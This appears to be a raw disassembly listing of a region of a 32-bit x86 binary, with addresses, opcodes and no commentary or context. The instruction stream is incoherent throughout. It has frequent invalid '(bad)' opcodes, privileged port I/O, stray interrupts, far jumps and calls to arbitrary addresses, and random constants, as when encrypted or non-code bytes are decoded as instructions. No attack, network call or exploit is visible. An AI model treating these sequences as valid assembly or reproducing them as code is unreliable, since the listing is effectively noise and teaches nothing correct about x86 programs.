  4158ca:	lods   eax,DWORD PTR fs:[esi]
  4158cc:	pop    eax
  4158cd:	inc    edx
  4158ce:	pop    ebp
  4158d0:	or     ch,BYTE PTR [ebx]
  4158d2:	out    0x80,al
  4158d4:	jg     0x415942
  4158d6:	pop    edx
  4158d7:	cld    
  4158d8:	ret    0xb10d
  4158db:	lea    esi,[ecx]
  4158dd:	aam    0x8a
  4158df:	test   al,0x2e
  4158e1:	xor    BYTE PTR ds:[esi],bh
  4158e4:	mov    ebp,0x80b78bef
  4158e9:	into   
  4158ea:	loope  0x4158bb
  4158ec:	hlt    
  4158ed:	push   cs
  4158ee:	xchg   edi,eax
  4158ef:	call   0x3b35:0xd2cba705
  4158f6:	es ret 
  4158f8:	and    eax,0x6b725b1e
  4158fd:	(bad)  
  4158fe:	(bad)  
  4158ff:	xor    ebx,DWORD PTR cs:[edx+esi*8]
  415903:	dec    edx
  415904:	aad    0xf5
  415906:	fcomp  st(6)
  415908:	loope  0x41597c
  41590a:	(bad)
  41590d:	mov    ch,0x8f
  41590f:	sahf   
  415910:	rcl    BYTE PTR [edx-0x64c9d314],1
  415916:	mov    DWORD PTR [ebp+ebp*8-0x2e],0xc9bd563b
  41591e:	mov    ah,0x83
  415920:	nop
  415921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415922:	pop    ebx
  415923:	pop    ds
  415924:	cmp    bh,bl
  415926:	jmp    0x415920
  415928:	test   al,0xd0
  41592a:	outs   dx,DWORD PTR ds:[esi]
  41592b:	xor    ebx,DWORD PTR [edx-0x58]
  41592e:	dec    ecx
  41592f:	stc    
  415930:	lea    ebp,[ebx-0xa]
  415933:	in     al,dx
  415934:	jmp    0x81c1c901
  415939:	or     DWORD PTR [edi+0x36850af6],esi
  41593f:	dec    esp
  415940:	sub    BYTE PTR [ebp+0x6e],ch
  415943:	jl     0x415973
  415945:	fucom  st(6)
  415947:	gs add BYTE PTR fs:[ecx],0x21
  41594c:	pop    edx
  41594d:	mov    bl,0xc4
  41594f:	push   ebx
  415950:	aas    
  415951:	inc    ecx
  415952:	int3   
  415953:	push   edi
  415954:	ins    DWORD PTR es:[edi],dx
  415955:	cmp    BYTE PTR [esp+ebx*4+0x49016b13],bl
  41595c:	fdivrp st(7),st
  41595e:	jecxz  0x4159c9
  415960:	jp     0x415920
  415962:	jno    0x415971
  415964:	(bad)  
  415965:	jmp    0x415914
  415967:	cld    
  415968:	shl    ebp,0x56
  41596b:	les    esp,FWORD PTR [ecx+0x6c]
  41596e:	mov    al,0x4b
  415970:	push   edx
  415971:	pop    edi
  415972:	fisttp DWORD PTR [ecx]
  415974:	test   DWORD PTR [edx-0x77b2689d],ebp
  41597a:	cmp    ch,dh
  41597c:	sub    esi,edi
  41597e:	stc    
  41597f:	mov    ebp,0x5c8f29f6
  415984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415985:	mov    dh,0x66
  415987:	(bad)  
  415988:	sub    BYTE PTR [ebx],al
  41598a:	adc    ah,BYTE PTR [ebx-0x4f]
  41598d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41598e:	mov    eax,0x9c436b70
  415993:	mov    al,ds:0xdede609c
  415998:	jmp    0x2d56:0xcac12443
  41599f:	mov    esi,0x4921afaa
  4159a4:	or     DWORD PTR [edx-0x5b94376e],ebp
  4159aa:	sub    eax,0xa55d735c
  4159af:	push   ds
  4159b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159b1:	and    eax,0x66514c51
  4159b6:	or     BYTE PTR [ebx],ch
  4159b8:	outs   dx,DWORD PTR ds:[esi]
  4159b9:	mov    ds:0xafa38cc4,eax
  4159be:	iret   
  4159bf:	stos   BYTE PTR es:[edi],al
  4159c0:	and    bl,BYTE PTR [eax+0x15d89457]
  4159c6:	xchg   esi,eax
  4159c7:	dec    ebx
  4159c8:	cmp    DWORD PTR [edi-0x67],edx
  4159cb:	out    0x2a,al
  4159cd:	test   eax,0xc083363c
  4159d2:	stos   DWORD PTR es:[edi],eax
  4159d3:	retf   
  4159d4:	mov    edi,0x332c403a
  4159d9:	icebp  
  4159da:	mov    DWORD PTR [ecx+eax*8],esp
  4159dd:	js     0x415961
  4159df:	sub    DWORD PTR [ecx+0x42],ebp
  4159e2:	mov    ds:0xf9c60a17,eax
  4159e7:	scas   al,BYTE PTR es:[edi]
  4159e8:	das    
  4159e9:	mov    ebp,esi
  4159eb:	push   ecx
  4159ec:	and    DWORD PTR [esi-0x66bc2f7d],0x49
  4159f3:	cmp    esp,0x4
  4159f6:	pop    ebx
  4159f7:	sub    al,0x30
  4159f9:	jl     0x4159a7
  4159fb:	pusha  
  4159fc:	inc    edi
  4159fd:	and    bl,BYTE PTR [eax]
  4159ff:	fcomip st,st(7)
  415a01:	push   ebp
  415a02:	sub    eax,DWORD PTR ss:[ebx-0x4b45571e]
  415a09:	rcl    DWORD PTR [ebp+edx*8-0x39],1
  415a0d:	jle    0x415a8d
  415a0f:	sub    dl,BYTE PTR [ecx+0x72]
  415a12:	inc    ecx
  415a13:	out    dx,eax
  415a14:	inc    ebp
  415a15:	sub    al,0x5c
  415a17:	mov    ds:0xc21f2f24,eax
  415a1c:	and    bh,BYTE PTR [ecx]
  415a1e:	jnp    0x415a49
  415a20:	dec    esp
  415a21:	adc    al,0x25
  415a23:	push   ds
  415a24:	sub    eax,0xca602619
  415a29:	(bad)
  415a2c:	push   ecx
  415a2d:	ret    0x4282
  415a30:	dec    esi
  415a31:	add    eax,0x76adfc4c
  415a36:	inc    edx
  415a37:	mov    edi,0x30197ae8
  415a3c:	outs   dx,DWORD PTR ds:[esi]
  415a3d:	xor    eax,0xd5e9b0b8
  415a42:	dec    esi
  415a43:	jbe    0x415a3b
  415a45:	mov    edi,0x3c9beee9
  415a4a:	xor    ah,BYTE PTR [eax-0x204107e1]
  415a50:	cld    
  415a51:	in     al,0xda
  415a53:	fild   QWORD PTR [eax+ecx*2-0x76aa24ea]
  415a5a:	pop    ebx
  415a5b:	or     DWORD PTR [edi],esi
  415a5d:	jo     0x415a2b
  415a5f:	scas   eax,DWORD PTR es:[edi]
  415a60:	push   ebx
  415a61:	jo     0x415ad7
  415a63:	sbb    al,0xf0
  415a65:	push   edi
  415a66:	pop    ss
  415a67:	sub    DWORD PTR [eax+0x5b7fa270],ebx
  415a6d:	repnz push ebp
  415a6f:	hlt    
  415a70:	and    dh,cl
  415a72:	pop    edx
  415a73:	bound  edx,QWORD PTR [ecx+edx*8+0x4d]
  415a77:	jle    0x415a57
  415a79:	dec    esi
  415a7a:	mov    ecx,0xe7641d4
  415a7f:	inc    edx
  415a80:	add    BYTE PTR [eax-0x4508cea3],dh
  415a86:	xor    cl,BYTE PTR [edx]
  415a88:	sub    DWORD PTR [ebp+ecx*2-0x4b50725b],eax
  415a8f:	aaa    
  415a90:	retf   0xf7c0
  415a93:	int    0x75
  415a95:	cmp    DWORD PTR [ebp-0x158b7aa7],ebx
  415a9b:	test   BYTE PTR [ebp+0x39edc351],0xab
  415aa2:	inc    ecx
  415aa3:	test   edx,esp
  415aa5:	ja     0x415a47
  415aa7:	jge    0x415ad6
  415aa9:	int    0x48
  415aab:	popf   
  415aac:	cmp    BYTE PTR [ebx],cl
  415aae:	add    edx,DWORD PTR [eax+0x2402a28f]
  415ab4:	fsubr  st,st(4)
  415ab6:	push   ebp
  415ab7:	push   0xffffff97
  415ab9:	mov    dl,bl
  415abb:	push   ds
  415abc:	rol    DWORD PTR [eax+0x20],1
  415abf:	ror    DWORD PTR [ecx+0x7f0e1f31],cl
  415ac5:	adc    al,0xb4
  415ac7:	retf   
  415ac8:	inc    edx
  415ac9:	push   cs
  415aca:	xor    BYTE PTR ds:0x4b4e89a1,dl
  415ad0:	and    eax,0x309e122
  415ad5:	sub    ecx,DWORD PTR [ecx-0x14ea0afc]
  415adb:	xor    al,0xe4
  415add:	stos   DWORD PTR es:[edi],eax
  415ade:	fbstp  TBYTE PTR [ecx-0x59]
  415ae1:	add    BYTE PTR [ebx],0xe9
  415ae4:	stos   DWORD PTR es:[edi],eax
  415ae5:	mov    ecx,0x42556fc9
  415aea:	xchg   ebp,eax
  415aeb:	xor    ebx,DWORD PTR [edx]
  415aed:	je     0x415b62
  415aef:	and    eax,0x227dacda
  415af4:	pop    es
  415af5:	cmp    eax,0x8ff6d38f
  415afa:	and    bl,BYTE PTR [edx]
  415afc:	dec    esi
  415afd:	(bad)  
  415aff:	mov    ebp,DWORD PTR [esi+0x10]
  415b02:	jle    0x415b6d
  415b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b05:	and    eax,0x69dd6f38
  415b0a:	imul   esp,DWORD PTR ds:[ebp+0x28a81b17],0x40
  415b12:	lea    eax,[ebx+0x212ea275]
  415b18:	and    bh,ah
  415b1a:	mov    al,ds:0x72d1cf11
  415b1f:	sbb    ah,BYTE PTR [esi-0x40645603]
  415b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b26:	popf   
  415b27:	inc    esi
  415b28:	cmp    al,0x10
  415b2a:	or     BYTE PTR [eax+0x2008ebb7],bl
  415b30:	xlat   BYTE PTR es:[ebx]
  415b32:	into   
  415b33:	cmp    BYTE PTR [eax-0x59b1f66d],ah
  415b39:	clc    
  415b3a:	xor    ebx,DWORD PTR [ebx]
  415b3c:	push   0x8816423f
  415b41:	mov    cl,0xf6
  415b43:	(bad)  
  415b44:	jno    0x415b4c
  415b46:	xor    eax,0xc456f2c0
  415b4b:	icebp  
  415b4c:	cwde   
  415b4d:	aaa    
  415b4e:	adc    ah,BYTE PTR es:[edi]
  415b51:	mov    eax,0x6a74eb9b
  415b56:	mov    ebx,0xe623dba8
  415b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b5d:	jmp    0x6c0a:0x552ccefd
  415b64:	or     esp,ebp
  415b66:	pop    esp
  415b67:	test   al,0x57
  415b69:	cs into 
  415b6b:	retf   
  415b6c:	ins    DWORD PTR es:[edi],dx
  415b6d:	mov    bl,ah
  415b6f:	inc    edx
  415b70:	mov    dl,0xe5
  415b72:	inc    edx
  415b73:	dec    ebp
  415b74:	pop    eax
  415b75:	xchg   edx,eax
  415b76:	arpl   WORD PTR [ebx-0x50],dx
  415b79:	fist   DWORD PTR [ecx+0x2a]
  415b7c:	and    BYTE PTR [ebx],ah
  415b7e:	daa    
  415b7f:	repz sub eax,0xab5106b2
  415b85:	das    
  415b86:	daa    
  415b87:	jo     0x415bbd
  415b89:	sub    ah,BYTE PTR [edi+0x51]
  415b8c:	es push ebx
  415b8e:	jne    0x415ba4
  415b90:	dec    edi
  415b91:	mov    bl,0x3c
  415b93:	aas    
  415b94:	mov    edi,0xeb7a8c90
  415b99:	mov    edi,0x4adb4675
  415b9e:	push   esp
  415b9f:	aam    0xbe
  415ba1:	in     al,0x12
  415ba3:	cmp    eax,0x2be46cd2
  415ba8:	xlat   BYTE PTR ds:[ebx]
  415ba9:	mov    ?,ecx
  415bab:	dec    bl
  415bad:	retf   0x5949
  415bb0:	inc    ebp
  415bb1:	pand   mm3,QWORD PTR [ebp+edi*8-0x54]
  415bb6:	loop   0x415c2c
  415bb8:	iret   
  415bb9:	fsubr  DWORD PTR [esi-0x6c]
  415bbc:	add    BYTE PTR [ebp+0x7b],al
  415bbf:	mov    BYTE PTR [edi+0x6f],bh
  415bc2:	sub    DWORD PTR [edi+0x16],esp
  415bc5:	push   es
  415bc6:	jno    0x415bb3
  415bc8:	pop    ebp
  415bc9:	jmp    0x55b8:0x701b4612
  415bd0:	mov    cl,0x7b
  415bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bd3:	and    edx,0xffffffb9
  415bd6:	into   
  415bd7:	cmp    al,0x46
  415bd9:	jle    0x415b7d
  415bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bdc:	mov    ds:0x4713094d,al
  415be1:	inc    ecx
  415be2:	dec    edx
  415be3:	push   ebx
  415be4:	push   ecx
  415be5:	jle    0x415c0b
  415be7:	cmp    DWORD PTR [eax-0x40e0d3d6],0xfffffff8
  415bee:	adc    BYTE PTR [ecx+0x7a2af6c7],ah
  415bf4:	popf   
  415bf5:	pop    ebp
  415bf6:	jbe    0x415bcb
  415bf8:	icebp  
  415bf9:	cmp    cl,BYTE PTR [esi+ecx*2+0x53]
  415bfd:	pushf  
  415bfe:	xlat   BYTE PTR ds:[ebx]
  415bff:	fstp   DWORD PTR [eax+0x6a25b69b]
  415c05:	out    dx,eax
  415c06:	mov    bl,BYTE PTR [ebp-0x6299f83]
  415c0c:	retf   0x7c05
  415c0f:	fidivr DWORD PTR [ebx+0x28]
  415c12:	inc    edx
  415c13:	xor    edi,DWORD PTR [edi+0x13]
  415c16:	sahf   
  415c17:	push   ds
  415c18:	jo     0x415be8
  415c1a:	mov    esp,DWORD PTR [eax]
  415c1c:	aas    
  415c1d:	lods   eax,DWORD PTR ds:[esi]
  415c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c1f:	shr    BYTE PTR [esi+0x3f],cl
  415c22:	call   0x4650980c
  415c27:	push   edx
  415c28:	int3   
  415c29:	les    ebp,FWORD PTR [edi+ecx*2-0x69]
  415c2d:	xchg   esp,eax
  415c2e:	test   dh,ch
  415c30:	xor    al,0x37
  415c32:	popa   
  415c33:	jns    0x415c13
  415c35:	aam    0x18
  415c37:	es jo  0x415bca
  415c3a:	pop    ds
  415c3b:	push   es
  415c3c:	mov    BYTE PTR [ecx],ch
  415c3e:	xchg   ecx,eax
  415c3f:	(bad)  
  415c40:	xchg   esi,eax
  415c41:	xor    DWORD PTR [ecx],ecx
  415c43:	mov    dl,0x23
  415c45:	neg    edi
  415c47:	fidivr WORD PTR [edx-0x30]
  415c4a:	jo     0x415c0a
  415c4c:	nop
  415c4d:	dec    eax
  415c4e:	pop    eax
  415c4f:	push   ebx
  415c50:	sub    BYTE PTR [eax+ebp*2+0x4a],0xec
  415c55:	sub    cl,ah
  415c57:	mov    dh,0xb3
  415c59:	mov    dl,0x5f
  415c5b:	push   edi
  415c5c:	cmp    DWORD PTR [ebp-0x3f],ebx
  415c5f:	icebp  
  415c60:	push   ecx
  415c61:	mov    esp,0x9370f71d
  415c66:	mov    WORD PTR [ecx+ebp*8+0x1933d6b7],fs
  415c6d:	adc    DWORD PTR [ebp+0x76],0x40f4c1d6
  415c74:	xor    DWORD PTR [ecx+0x5c],esi
  415c77:	jne    0x415c2d
  415c79:	dec    edx
  415c7a:	sbb    edx,DWORD PTR [esi+0x1e]
  415c7d:	fwait
  415c7e:	test   al,0xbc
  415c80:	xor    eax,0xed94190c
  415c85:	mov    eax,ds:0xa3e72656
  415c8a:	iret   
  415c8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c8c:	sbb    DWORD PTR [ecx+0x7e],ecx
  415c8f:	and    ah,cl
  415c91:	fistp  QWORD PTR [edi-0x62]
  415c94:	mov    esp,0x0
	...
  415d11:	add    BYTE PTR [eax],al
  415d13:	add    BYTE PTR [ebp-0x29],dl
  415d16:	mov    edx,0x7defba87
  415d1b:	xlat   BYTE PTR ds:[ebx]
  415d1c:	lea    esp,[esi+edx*4+0x6a]
  415d20:	push   ecx
  415d21:	popa   
  415d22:	pusha  
  415d23:	inc    esp
  415d24:	mov    esi,0x69000101
  415d29:	pop    es
  415d2a:	add    BYTE PTR [eax],al
  415d2c:	fcmove st,st(3)
  415d2e:	mov    dl,0xb4
  415d30:	mov    ebp,DWORD PTR [esi-0x5e42e1b4]
  415d36:	test   BYTE PTR [ebp+0x8e4206e],ah
  415d3c:	repnz pop ss
  415d3e:	push   ecx
  415d3f:	inc    ecx
  415d40:	adc    al,0xd5
  415d42:	and    eax,0x4a6d89d2
  415d47:	pop    ds
  415d48:	les    edx,FWORD PTR [ebx]
  415d4a:	mov    al,0x22
  415d4c:	out    0xf,al
  415d4e:	out    0xf9,al
  415d50:	xchg   edx,eax
  415d51:	xor    BYTE PTR [edi-0x75cc2c39],ah
  415d57:	dec    ebx
  415d58:	sub    eax,0xfdd4f2ed
  415d5d:	dec    esp
  415d5e:	xor    DWORD PTR [edx],0x747652ea
  415d64:	call   0xd5fb:0xc8f2d376
  415d6b:	ficomp DWORD PTR [ebx-0x32]
  415d6e:	add    DWORD PTR [edx+0x4b],ecx
  415d71:	sub    eax,0xe766b886
  415d76:	push   ebx
  415d77:	sti    
  415d78:	cwde   
  415d79:	or     DWORD PTR [edi-0x3a024fa6],esp
  415d7f:	mov    edx,0xa13de54c
  415d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d85:	xchg   edi,eax
  415d86:	(bad)  
  415d87:	sar    ebp,1
  415d89:	xchg   ebp,eax
  415d8a:	(bad)  
  415d8b:	xor    eax,esi
  415d8d:	sub    BYTE PTR [edx+0x1d],bh
  415d90:	ds jmp 0xdc45c9da
  415d96:	icebp  
  415d97:	mov    ds:0x9f30958a,eax
  415d9c:	jmp    0x5ddb:0xdf9891d9
  415da3:	ss dec eax
  415da5:	xor    al,0x95
  415da7:	loope  0x415e01
  415da9:	inc    ebx
  415daa:	add    eax,0x759251dd
  415daf:	retf   
  415db0:	xchg   ebx,eax
  415db1:	push   ss
  415db2:	(bad)
  415db6:	sub    edx,DWORD PTR [ecx-0x80e8308]
  415dbc:	call   0x45c5331
  415dc1:	aas    
  415dc2:	into   
  415dc3:	xchg   ecx,eax
  415dc4:	and    al,BYTE PTR [edi+0x6df5ae6d]
  415dca:	jl     0x415db5
  415dcc:	push   cs
  415dcd:	inc    eax
  415dce:	sbb    al,0x1f
  415dd0:	stos   DWORD PTR es:[edi],eax
  415dd1:	xlat   BYTE PTR ds:[ebx]
  415dd2:	sub    DWORD PTR [esi],0xffffffdc
  415dd5:	enter  0x2b86,0xa4
  415dd9:	xchg   esp,eax
  415dda:	stos   DWORD PTR es:[edi],eax
  415ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ddd:	cmp    ch,dl
  415ddf:	fdivr  QWORD PTR [edi+ebp*8+0x78849f7]
  415de6:	mov    al,ds:0x681d11fb
  415deb:	sbb    edx,esi
  415ded:	cmc    
  415dee:	aaa    
  415def:	lods   eax,DWORD PTR ds:[esi]
  415df0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415df1:	ins    DWORD PTR es:[edi],dx
  415df2:	call   0xbcbc10b7
  415df7:	mov    ch,0xb0
  415df9:	cwde   
  415dfa:	lea    esp,[esi-0x1c896c8f]
  415e00:	adc    BYTE PTR [edi-0x3bf5b75f],ah
  415e06:	dec    ebp
  415e07:	out    dx,eax
  415e08:	xor    BYTE PTR [ebx-0x47],bl
  415e0b:	or     al,0xf5
  415e0d:	and    ecx,ebp
  415e0f:	push   0xb
  415e11:	cmp    eax,0x7fc5db44
  415e16:	add    ch,cl
  415e18:	sti    
  415e19:	iret   
  415e1a:	sub    BYTE PTR [ebx-0x209882e0],0x4d
  415e21:	pop    esp
  415e22:	push   edx
  415e23:	(bad)  
  415e24:	fadd   DWORD PTR [ebx+0x29843437]
  415e2a:	mov    edx,0xc81ce2b7
  415e2f:	in     al,0xe1
  415e31:	call   0x356b:0x87771fa2
  415e38:	dec    esp
  415e39:	sahf   
  415e3a:	add    al,0xe1
  415e3c:	push   esi
  415e3d:	(bad)  
  415e3e:	fcomip st,st(6)
  415e40:	mov    ch,0xe1
  415e42:	dec    edx
  415e43:	mov    al,ds:0x64bdb2d1
  415e48:	xlat   BYTE PTR ds:[ebx]
  415e49:	call   0xb429:0x6dcfb412
  415e50:	cdq    
  415e51:	in     eax,0xf3
  415e53:	in     al,dx
  415e54:	int    0x4f
  415e56:	mov    eax,ds:0x1be1a71a
  415e5b:	(bad)  
  415e5c:	fnstenv [eax+0x604baa63]
  415e62:	adc    eax,0xba443566
  415e67:	xor    dl,dl
  415e69:	lods   al,BYTE PTR ds:[esi]
  415e6a:	jmp    FWORD PTR [edx]
  415e6c:	sub    bl,BYTE PTR [edi+0x4e879bb]
  415e72:	scas   al,BYTE PTR es:[edi]
  415e73:	jns    0x415e5d
  415e75:	bound  edi,QWORD PTR [ebp-0x27]
  415e78:	dec    esi
  415e79:	loop   0x415e3f
  415e7b:	jmp    DWORD PTR [esi+0x37]
  415e7e:	(bad)  
  415e7f:	xchg   ebp,eax
  415e80:	mov    ecx,0xd4642e9d
  415e85:	xchg   DWORD PTR [ecx-0x25],ecx
  415e88:	xor    ch,BYTE PTR [edi+0x402c0ebf]
  415e8e:	add    eax,0x236fb33f
  415e93:	test   BYTE PTR [edi],dl
  415e95:	fcom   QWORD PTR [eax-0x46818a37]
  415e9b:	sub    al,0xe5
  415e9d:	loopne 0x415eb3
  415e9f:	cmp    DWORD PTR [esp+edi*1],0x7f
  415ea3:	(bad)  
  415ea4:	pop    esi
  415ea5:	lea    eax,[eax]
  415ea7:	mov    ds:0xcfd3b9f6,eax
  415eac:	mov    ecx,0x6222deba
  415eb1:	scas   al,BYTE PTR es:[edi]
  415eb2:	sub    DWORD PTR [ecx],esi
  415eb4:	popa   
  415eb5:	sub    edx,ecx
  415eb7:	mov    bh,0x9c
  415eb9:	scas   al,BYTE PTR es:[edi]
  415eba:	sbb    al,0xeb
  415ebc:	js     0x415eb3
  415ebe:	jg     0x415f20
  415ec0:	(bad)  [eax]
  415ec2:	sbb    eax,DWORD PTR [edi+0x61]
  415ec5:	pop    eax
  415ec6:	sub    eax,0xb99ec76b
  415ecb:	and    eax,0xe3124b41
  415ed0:	out    dx,al
  415ed1:	fstp   DWORD PTR [ebx]
  415ed3:	std    
  415ed4:	ret    0xcc69
  415ed7:	sub    eax,0x2ad26b6b
  415edc:	test   al,0xe2
  415ede:	jnp    0x415f28
  415ee0:	jp     0x415e8b
  415ee2:	outs   dx,BYTE PTR ds:[esi]
  415ee3:	jmp    0x9ba0e220
  415ee8:	(bad)  
  415ee9:	rcl    DWORD PTR [ebp+0x3b40a0c1],cl
  415eef:	cmp    ebx,ecx
  415ef1:	cmp    ch,BYTE PTR [ebp-0x49e8c937]
  415ef7:	stc    
  415ef8:	and    dh,BYTE PTR [eax+ebx*8]
  415efb:	inc    esi
  415efc:	(bad)  
  415efe:	jbe    0x415eb7
  415f00:	inc    eax
  415f01:	jne    0x415f6e
  415f03:	add    eax,0x63884735
  415f08:	dec    esp
  415f09:	call   0x4d42d9ad
  415f0e:	fcmovb st,st(3)
  415f10:	or     BYTE PTR [eax],bh
  415f12:	inc    esi
  415f13:	aaa    
  415f14:	rol    DWORD PTR [ecx],0xe1
  415f17:	lods   al,BYTE PTR gs:[esi]
  415f19:	adc    al,0x6f
  415f1b:	bound  ecx,QWORD PTR [esi-0x65d544e4]
  415f21:	out    dx,eax
  415f22:	sbb    ebp,DWORD PTR [eax+0x1d]
  415f25:	das    
  415f26:	mov    ah,0x9f
  415f28:	adc    esp,ebx
  415f2a:	inc    eax
  415f2b:	outs   dx,DWORD PTR ds:[esi]
  415f2c:	popf   
  415f2d:	(bad)  
  415f2f:	dec    eax
  415f30:	fcos   
  415f32:	dec    edi
  415f33:	in     eax,dx
  415f34:	add    eax,0x4cb2fc14
  415f39:	inc    esi
  415f3a:	xchg   DWORD PTR [edi+ecx*8+0x6c],edx
  415f3e:	mov    al,0xcd
  415f40:	icebp  
  415f41:	jae    0x415eda
  415f43:	sbb    cl,BYTE PTR [esi+0x78]
  415f46:	sbb    al,0x9a
  415f48:	mov    WORD PTR [edx-0x61],?
  415f4b:	mov    ch,0xc1
  415f4d:	hlt    
  415f4e:	ret    
  415f4f:	cmp    al,0x9
  415f51:	or     esi,ebp
  415f53:	add    ch,ah
  415f55:	daa    
  415f56:	cwde   
  415f57:	sar    dh,cl
  415f59:	hlt    
  415f5a:	and    eax,0xc357bc04
  415f5f:	xchg   ebp,eax
  415f60:	arpl   WORD PTR [eax-0x77],ax
  415f63:	(bad)  
  415f64:	jp     0x415f77
  415f66:	mov    bh,0xfc
  415f68:	out    dx,al
  415f69:	inc    esp
  415f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f6b:	pop    ecx
  415f6c:	out    0xf1,eax
  415f6e:	in     eax,0x24
  415f70:	mov    cl,0xf3
  415f72:	pop    ebx
  415f73:	lock pop edi
  415f75:	inc    ebx
  415f76:	adc    bl,ah
  415f78:	pop    ecx
  415f79:	push   ss
  415f7a:	ss inc esp
  415f7c:	push   ds
  415f7d:	add    DWORD PTR [esi],eax
  415f7f:	or     ebp,DWORD PTR [ebp-0x78b34784]
  415f85:	scas   al,BYTE PTR es:[edi]
  415f86:	data16 std 
  415f88:	add    DWORD PTR [edx+0x79399142],edx
  415f8e:	sti    
  415f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f90:	(bad)  
  415f91:	dec    esi
  415f92:	dec    edx
  415f93:	fadd   QWORD PTR [esi+ebx*8]
  415f96:	ds pop ss
  415f98:	push   cs
  415f99:	push   eax
  415f9a:	popf   
  415f9b:	xchg   edx,eax
  415f9c:	test   al,0x8
  415f9e:	in     al,dx
  415f9f:	xchg   DWORD PTR [ecx],ecx
  415fa1:	in     al,dx
  415fa2:	jns    0x415ff1
  415fa4:	mov    ds:0xefe10de4,eax
  415fa9:	add    edx,edx
  415fab:	and    DWORD PTR [edx],eax
  415fad:	mov    dh,0x48
  415faf:	stos   BYTE PTR es:[edi],al
  415fb0:	test   eax,0xf686d9e
  415fb5:	jns    0x415f60
  415fb7:	xchg   esi,eax
  415fb8:	dec    esp
  415fb9:	xor    eax,0xda58b6a0
  415fbe:	xor    esp,DWORD PTR [ecx+0x4e]
  415fc1:	jno    0x415fe1
  415fc3:	and    ebx,edx
  415fc5:	stc    
  415fc6:	mov    esi,0x8657b753
  415fcb:	mov    BYTE PTR [esi+eax*2],dh
  415fce:	mov    DWORD PTR [esi],esp
  415fd0:	aas    
  415fd1:	xor    DWORD PTR [esi],edx
  415fd3:	dec    ebp
  415fd4:	out    dx,al
  415fd5:	pop    eax
  415fd6:	dec    eax
  415fd7:	aad    0xea
  415fd9:	das    
  415fda:	xor    ah,BYTE PTR [esi-0x5209e2cc]
  415fe0:	jle    0x415f8b
  415fe2:	test   BYTE PTR [edi-0x1043a1b6],dh
  415fe8:	or     al,0x6e
  415fea:	xor    BYTE PTR [ecx-0x65340c4b],0xae
  415ff1:	sbb    ebp,DWORD PTR [edx]
  415ff3:	imul   eax,DWORD PTR [edi+0x7eb04ba],0xffffffb0
  415ffa:	push   edx
  415ffb:	and    cl,BYTE PTR [ebx]
  415ffd:	mov    al,BYTE PTR [esi]
  415fff:	mov    ebp,0xc7593032
  416004:	jl     0x41605d
  416006:	dec    edi
  416007:	enter  0xcdf8,0x79
  41600b:	and    eax,0xb763a9f9
  416010:	jle    0x415fe0
  416012:	je     0x41605e
  416014:	popf   
  416015:	add    al,0x0
  416017:	xchg   BYTE PTR es:[ebx],ah
  41601a:	popf   
  41601b:	mov    ds:0xbe4fe98a,al
  416020:	dec    ebx
  416021:	add    DWORD PTR [esi-0x53b663b],eax
  416027:	dec    edx
  416028:	adc    ecx,esp
  41602a:	ret    0xcc20
  41602d:	mov    bh,0x56
  41602f:	and    ebp,ebp
  416031:	fst    QWORD PTR [ebp-0x11]
  416034:	mov    edi,0xe9ec7a6
  416039:	dec    edi
  41603a:	mov    ch,0xc9
  41603c:	mov    dh,0x37
  41603e:	repz or BYTE PTR [ecx+0x35211bc2],dh
  416045:	and    BYTE PTR [ecx-0x10],0xa6
  416049:	cmp    ah,BYTE PTR [ebp+0x1fa9fbc0]
  41604f:	cmp    dh,0x7d
  416052:	dec    eax
  416053:	xor    cl,dl
  416055:	push   ecx
  416056:	in     eax,0x83
  416058:	fnstsw WORD PTR [eax+0x65]
  41605b:	mov    bl,0xe0
  41605d:	mov    ecx,0x1a219523
  416062:	(bad)  
  416063:	pop    ecx
  416064:	rcr    BYTE PTR [esi+0x3e0f2bd0],1
  41606a:	jge    0x4160d9
  41606c:	jne    0x41602e
  41606e:	dec    esp
  41606f:	retf   
  416070:	cwde   
  416071:	not    dh
  416073:	lea    ebx,[eax]
  416075:	dec    ebx
  416076:	push   edi
  416077:	retf   0x8ea4
  41607a:	ss pop esp
  41607c:	(bad)  
  41607e:	jmp    esp
  416080:	mov    ss,WORD PTR [esi+ebp*4]
  416083:	adc    eax,0x8561b1af
  416088:	jge    0x416045
  41608a:	fld    QWORD PTR [eax]
  41608c:	mov    eax,ds:0x93002aa4
  416091:	enter  0xa658,0xbc
  416095:	jl     0x416116
  416097:	sub    al,0x30
  416099:	mov    ch,0x1c
  41609b:	daa    
  41609c:	leave  
  41609d:	mov    ecx,0x5375e95
  4160a2:	cmp    al,0x95
  4160a4:	popa   
  4160a5:	dec    ecx
  4160a6:	jnp    0x416119
  4160a8:	dec    esi
  4160a9:	retf   0x9c09
  4160ac:	add    ebx,ecx
  4160ae:	in     al,0x3a
  4160b0:	fcom   QWORD PTR [eax+0x49]
  4160b3:	sbb    ecx,ebx
  4160b5:	sub    cx,cx
  4160b8:	dec    esp
  4160b9:	push   ecx
  4160ba:	lods   al,BYTE PTR ds:[esi]
  4160bb:	add    BYTE PTR [esi-0x4f],bh
  4160be:	fcomp  QWORD PTR [esp+ebx*2]
  4160c1:	inc    esp
  4160c2:	mov    gs,edi
  4160c4:	mov    dl,0xc0
  4160c6:	scas   al,BYTE PTR es:[edi]
  4160c7:	mov    eax,ds:0x788b97a0
  4160cc:	xchg   ebp,eax
  4160cd:	mov    cl,0x91
  4160d0:	cwde   
  4160d1:	dec    esi
